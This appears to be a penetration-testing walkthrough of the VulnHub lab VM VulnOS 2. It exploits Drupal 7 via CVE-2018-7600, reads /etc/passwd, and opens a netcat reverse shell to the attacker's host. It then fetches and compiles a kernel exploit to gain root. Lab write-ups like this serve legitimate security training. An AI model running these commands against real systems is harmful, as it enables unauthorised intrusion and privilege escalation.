# Machine Link
https://www.vulnhub.com/entry/vulnos-2,147/

**About Release**

- **Name**: VulnOS: 2
- **Date release**: 17 May 2016
- **Author**: [c4b3rw0lf](https://www.vulnhub.com/author/c4b3rw0lf,66/)
- **Series**: [VulnOS](https://www.vulnhub.com/series/vulnos,36/)

**Description**
VulnOS are a series of vulnerable operating systems packed as virtual images to enhance penetration testing skills

- This is version 2 -

Smaller, less chaotic !

As time is not always on my side, It took a long time to create another VulnOS. But I like creating them. The image is build with VBOX. Unpack the file and add it to your virtualisation software.

Your assignment is to pentest a company website, get root of the system and read the final flag

IP : 192.168.1.174

# Nmap

Port Scanning on the target ip :
```bash
namp -v -p- 192.168.1.174
```

Discovered three open ports :
<img width="1361" height="871" alt="image" src="https://github.com/user-attachments/assets/3ffc8b51-6b68-4e45-ad09-813a22687817" />

Now when we visit the port 80 of the target ip, we see this page :
<img width="1919" height="1048" alt="image" src="https://github.com/user-attachments/assets/12bcded7-ee5d-4af7-93af-e95c62dfc3c5" />

When clicking on the “website”, there is a jabc company’s website running in the directory jabc :
<img width="1916" height="1048" alt="image" src="https://github.com/user-attachments/assets/8d562f11-a997-46da-9222-16b92b611ecf" />

Using CMSeek to scan VulnOS2 :
[https://github.com/Tuhinshubhra/CMSeeK](https://github.com/Tuhinshubhra/CMSeeK)

```bash
python cmseek.py -u http://192.168.1.174/jabc
```

<img width="1434" height="761" alt="image" src="https://github.com/user-attachments/assets/cd659e37-ef87-452f-a58d-4611e3fa3bbc" />

We found out drupal 7 is being used.
Search on google for drupal 7 exploits.

Download the python exploit for RCE :

[https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

The CVE we found : **CVE-2018-7600**
Vulnerability Reference : [https://nvd.nist.gov/vuln/detail/cve-2018-7600](https://nvd.nist.gov/vuln/detail/cve-2018-7600)

```bash
#this will show id command output
python drupa7-CVE-2018-7600.py http://192.168.1.174/jabc/

#to give a specific command
python drupa7-CVE-2018-7600.py http://192.168.1.174/jabc/ -c "cat /etc/passwd"

#run uname -a command for finding target system architecture
python drupa7-CVE-2018-7600.py http://192.168.1.174/jabc/ -c "uname -a"
```

---
# Reverse Shell

Now obtain reverse shell via netcat
Confirm netcat installed in the target system :

```bash
python drupa7-CVE-2018-7600.py http://192.168.1.174/jabc/ -c "which nc"
```
<img width="1475" height="440" alt="image" src="https://github.com/user-attachments/assets/41d742e4-39e0-4053-918a-9046cdf9f0c7" />


Give reverse shell command and start a listner on attackers system :

```bash
#start a listner
nc -nlvp 443

python drupa7-CVE-2018-7600.py http://192.168.1.174/jabc/ -c "nc 192.168.1.8 443 -e /bin/bash"
```

<img width="869" height="236" alt="image" src="https://github.com/user-attachments/assets/b7b021a7-ed20-4b7d-be7f-82e285281827" />


---
# Privilege Escalation

Find the kernel version :

```bash
uname -r
```

<img width="587" height="176" alt="image" src="https://github.com/user-attachments/assets/f6292dbe-7533-4c15-a1df-503aab1eeebd" />


We found the kernel version to be **3.13.0-24**

This version (3.13.0) was in the vulnerable kernels as checked in this github repo :
https://github.com/lucyoa/kernel-exploits
https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md

Search for kernel exploits for this version.
https://www.exploit-db.com/exploits/37292

Using this exploit :
```bash
cd /tmp

wget https://www.exploit-db.com/download/37292 -O exploit.c

gcc exploit.c -o exploit

./exploit
```

<img width="1320" height="851" alt="image" src="https://github.com/user-attachments/assets/4b4cec22-57e6-4a88-a3bd-bce30363ff60" />

We got the root shell!!!

---
